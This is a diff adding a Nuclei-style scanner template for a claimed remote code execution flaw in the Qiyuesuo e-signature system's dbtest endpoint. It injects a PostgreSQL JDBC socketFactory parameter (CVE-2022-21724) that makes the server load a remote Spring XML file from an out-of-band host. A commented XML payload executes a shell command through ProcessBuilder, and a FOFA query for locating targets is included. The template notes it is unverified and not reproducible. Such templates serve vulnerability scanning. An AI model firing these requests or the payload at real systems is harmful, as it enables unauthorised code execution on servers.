@@ -1,0 +1,67 @@
+id: qiyuesuo-dbtest-rce
+info:
+  name: 契约锁电子签章系统dbtest RCE
+  author: leadlife
+  severity: critical
+  description: 契约锁，是上海亘岩网络科技有限公司联合数字证书认证中心、公证处、知名律协一起全力打造的数字化可信基础服务平台；为组织提供“数字身份、电子签章、印章管控以及数据存证服务”于一体的数字化可信基础解决方案。
+  reference: 
+    - https://mp.weixin.qq.com/s/2CkkpotZJ6XwSeuyXf5lRg
+    - https://cn-sec.com/archives/4167532.html
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: app="契约锁-电子签署平台"
+    hunter-query: demo
+    tips: 漏洞无法复现利用
+    repair:
+    version:
+  tags: rce,qiyuesuo,oob
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/setup/dbtest/api/setup/dbtest?db=POSTGRESQL&host=localhost&port={{ports}}&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F{{interactsh-url}}%2F1%2Exml"
+      - "{{BaseURL}}/setup/dbtest?db=POSTGRESQL&host=localhost&port={{ports}}&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F{{interactsh-url}}%2F1%2Exml"
+      - "{{BaseURL}}/api/setup/dbtest?db=POSTGRESQL&host=localhost&port={{ports}}&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2F{{interactsh-url}}%2F1%2Exml"
+
+    payloads:
+      ports:
+        - 5511
+        - 5321
+    
+    attack: pitchfork
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      # - type: word
+      #   part: interactsh_protocol
+      #   words:
+      #     - "dns"
+      #     - "http"
+      #   condition: or
+
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'dbCheckItem','CONNECTION')
+        condition: and
+
+# 漏洞利用的是 PostgreSQL JDBC Driver RCE（CVE-2022-21724）
+
+
+# <beans xmlns="http://www.springframework.org/schema/beans"
+#        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+#        xmlns:p="http://www.springframework.org/schema/p"
+#        xsi:schemaLocation="http://www.springframework.org/schema/beans
+#         http://www.springframework.org/schema/beans/spring-beans.xsd">
+#    <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
+#         <constructor-arg>
+#           <list>
+#             <value>/bin/sh</value>
+#             <value>-c</value>
+#             <value>touch /tmp/test</value>
+#           </list>
+#         </constructor-arg>
+#     </bean>
+# </beans>
